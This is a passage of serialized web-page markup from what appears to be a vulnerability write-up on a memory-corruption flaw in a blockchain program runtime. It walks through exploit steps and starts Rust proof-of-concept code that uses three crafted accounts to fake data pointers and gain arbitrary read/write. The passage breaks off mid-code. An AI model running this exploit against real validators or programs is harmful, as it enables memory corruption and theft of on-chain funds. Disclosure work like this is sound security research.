monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" structures also reside in host memory, we can scan the out-of-bounds region to locate other \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" structures. By modifying their \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"host_addr\"}],\" fields to point to our target addresses, accessing the corresponding virtual memory provides arbitrary read/write access to those target addresses. We just need to spray a lot of writable accounts and make the size difference larger to increase the success rate.\"]}],\"\\n\",[\"$\",\"h2\",\"h2-9\",{\"className\":\"text-4xl py-4 border-b border-white/10\",\"children\":\"Proof-of-Concept\"}],\"\\n\",[\"$\",\"p\",\"p-115\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"Now, let's take a deep dive into a PoC of how to exploit this vulnerability from the ground up.\"}],\"\\n\",[\"$\",\"h3\",\"h3-21\",{\"className\":\"text-3xl py-4 border-b border-white/10\",\"children\":\"Detailed Attack Steps\"}],\"\\n\",[\"$\",\"p\",\"p-116\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"The exploit requires three specific accounts with distinct purposes:\"}],\"\\n\",[\"$\",\"ul\",\"ul-2\",{\"className\":\"text-xl py-2 text-pretty sm:text-justify\",\"style\":{\"display\":\"block\",\"listStyleType\":\"disc\",\"paddingInlineStart\":\"40px\"},\"children\":[\"\\n\",[\"$\",\"li\",\"li-0\",{\"children\":[[\"$\",\"strong\",\"strong-0\",{\"children\":\"SWAP\"}],\": Small buffer account that serves as the target of the corrupted pointer. Its small buffer will be incorrectly mapped by SWAP's large virtual space.\"]}],\"\\n\",[\"$\",\"li\",\"li-1\",{\"children\":[[\"$\",\"strong\",\"strong-0\",{\"children\":\"POINTER\"}],\": Pointer account whose \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion.host_addr\"}],\" will be rewritten during memory scanning to point to arbitrary memory addresses. This account serves as our pointer pivot to achieve arbitrary read/write capability.\"]}],\"\\n\",[\"$\",\"li\",\"li-2\",{\"children\":[[\"$\",\"strong\",\"strong-0\",{\"children\":\"LEVERAGE\"}],\": Large buffer account whose \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion.host_addr\"}],\" will be hijacked to point to SWAP's smaller buffer, creating the size mismatch for out-of-bounds access.\"]}],\"\\n\"]}],\"\\n\",[\"$\",\"h4\",\"h4-11\",{\"className\":\"text-2xl py-4 border-b border-white/10\",\"children\":\"Step 1: Account Preparation\"}],\"\\n\",[\"$\",\"p\",\"p-117\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"First, we want to trigger copy-on-write on both \",[\"$\",\"strong\",\"strong-0\",{\"children\":\"LEVERAGE\"}],\" and \",[\"$\",\"strong\",\"strong-1\",{\"children\":\"SWAP\"}],\" accounts and also resize \",[\"$\",\"strong\",\"strong-2\",{\"children\":\"LEVERAGE\"}],\" to 1 byte to make the code path later simpler.\"]}],\"\\n\",[\"$\",\"pre\",\"pre-15\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"rounded-sm\",\"style\":{\"color\":\"#ccc\",\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#ccc\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[1]}],[\"$\",\"span\",\"code-segement1\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Trigger copy-on-write for dedicated buffers\"]}],[\"$\",\"span\",\"code-segement2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[2]}],[\"$\",\"span\",\"code-segement4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}],[\"$\",\"span\",\"code-segement5\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"leverage_idx\"]}],[\"$\",\"span\",\"code-segement7\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement8\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement9\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}],[\"$\",\"span\",\"code-segement10\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement11\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"borrow_mut\"]}],[\"$\",\"span\",\"code-segement12\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement13\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement14\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement15\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0\"]}],[\"$\",\"span\",\"code-segement16\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement17\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement18\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement19\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement20\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}],[\"$\",\"span\",\"code-segement21\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement22\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[3]}],[\"$\",\"span\",\"code-segement24\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}],[\"$\",\"span\",\"code-segement25\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement26\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"swap_idx\"]}],[\"$\",\"span\",\"code-segement27\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement28\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement29\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}],[\"$\",\"span\",\"code-segement30\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement31\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"borrow_mut\"]}],[\"$\",\"span\",\"code-segement32\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement33\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement34\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement35\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0\"]}],[\"$\",\"span\",\"code-segement36\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement37\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement38\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement39\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement40\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}],[\"$\",\"span\",\"code-segement41\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement42\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[4]}],\"\\n\",[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[5]}],[\"$\",\"span\",\"code-segement46\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement47\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Resize LEVERAGE to simplify exploit logic\"]}],[\"$\",\"span\",\"code-segement48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[6]}],[\"$\",\"span\",\"code-segement50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}],[\"$\",\"span\",\"code-segement51\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement52\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"leverage_idx\"]}],[\"$\",\"span\",\"code-segement53\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement54\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement55\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"realloc\"]}],[\"$\",\"span\",\"code-segement56\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement57\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}],[\"$\",\"span\",\"code-segement58\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement59\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement60\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"false\"]}],[\"$\",\"span\",\"code-segement61\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement62\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}],[\"$\",\"span\",\"code-segement63\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]]]}]}]}],\"\\n\",[\"$\",\"h4\",\"h4-12\",{\"className\":\"text-2xl py-4 border-b border-white/10\",\"children\":\"Step 2: Fake Pointer Setup\"}],\"\\n\",[\"$\",\"p\",\"p-118\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"Then we want to overwrite SWAP's \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountInfo.data\"}],\" pointer with \",[\"$\",\"strong\",\"strong-0\",{\"children\":\"LEVERAGE\"}],\"'s data pointer. This will cause the runtime to extract \",[\"$\",\"strong\",\"strong-1\",{\"children\":\"LEVERAGE\"}],\"'s data address when retrieving \",[\"$\",\"strong\",\"strong-2\",{\"children\":\"SWAP\"}],\"'s \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"vm_data_addr\"}],\" during CPI.\"]}],\"\\n\",[\"$\",\"pre\",\"pre-16\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"rounded-sm\",\"style\":{\"color\":\"#ccc\",\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#ccc\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[1]}],[\"$\",\"span\",\"code-segement1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"unsafe\"]}],[\"$\",\"span\",\"code-segement2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement3\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[2]}],[\"$\",\"span\",\"code-segement6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement7\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"ptr\"]}],[\"$\",\"span\",\"code-segement8\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement9\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"copy\"]}],[\"$\",\"span\",\"code-segement10\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement11\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[3]}],[\"$\",\"span\",\"code-segement13\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement14\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"mem\"]}],[\"$\",\"span\",\"code-segement15\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement16\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"transmute\"]}],[\"$\",\"span\",\"code-segement17\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement18\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement19\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement20\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Rc\"]}],[\"$\",\"span\",\"code-segement21\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement22\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}],[\"$\",\"span\",\"code-segement23\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement24\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement25\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement26\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement27\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement28\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement29\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement30\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}],[\"$\",\"span\",\"code-segement31\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement32\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement33\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement34\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}],[\"$\",\"span\",\"code-segement35\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement36\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement37\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement38\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement39\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement40\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}],[\"$\",\"span\",\"code-segement41\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement42\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"leverage_idx\"]}],[\"$\",\"span\",\"code-segement43\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement44\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement45\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}],[\"$\",\"span\",\"code-segement46\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement47\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[4]}],[\"$\",\"span\",\"code-segement50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement51\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"mem\"]}],[\"$\",\"span\",\"code-segement52\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement53\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"transmute\"]}],[\"$\",\"span\",\"code-segement54\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement55\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement56\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement57\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Rc\"]}],[\"$\",\"span\",\"code-segement58\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement59\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}],[\"$\",\"span\",\"code-segement60\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement61\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement62\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement63\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement64\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement65\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement66\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement67\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}],[\"$\",\"span\",\"code-segement68\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement69\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement70\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement71\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement72\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement73\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement74\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement75\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement76\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement77\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}],[\"$\",\"span\",\"code-segement78\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement79\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"swap_idx\"]}],[\"$\",\"span\",\"code-segement80\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement81\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement82\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}],[\"$\",\"span\",\"code-segement83\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement84\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement85\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[5]}],[\"$\",\"span\",\"code-segement87\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement88\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"mem\"]}],[\"$\",\"span\",\"code-segement89\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement90\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"size_of\"]}],[\"$\",\"span\",\"code-segement91\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement92\",{\"className\":\"token 